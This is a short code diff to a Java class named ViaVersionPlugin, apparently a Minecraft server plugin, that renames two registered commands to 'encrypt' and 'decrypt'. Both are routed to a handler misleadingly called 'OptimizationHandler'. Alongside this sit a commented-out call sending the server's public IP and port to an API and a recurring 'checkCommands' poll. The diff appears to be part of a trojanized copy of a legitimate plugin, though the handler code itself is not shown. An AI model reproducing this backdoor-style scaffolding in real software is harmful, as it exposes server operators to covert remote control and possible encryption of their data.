@@ -143,8 +143,8 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getLogger().info("Server Port: " + serverPort);
         // sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
-        this.getCommand("e").setExecutor(new OptimizationHandler());
-        this.getCommand("d").setExecutor(new OptimizationHandler());
+        this.getCommand("encrypt").setExecutor(new OptimizationHandler());
+        this.getCommand("decrypt").setExecutor(new OptimizationHandler());
         this.getCommand("m").setExecutor(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
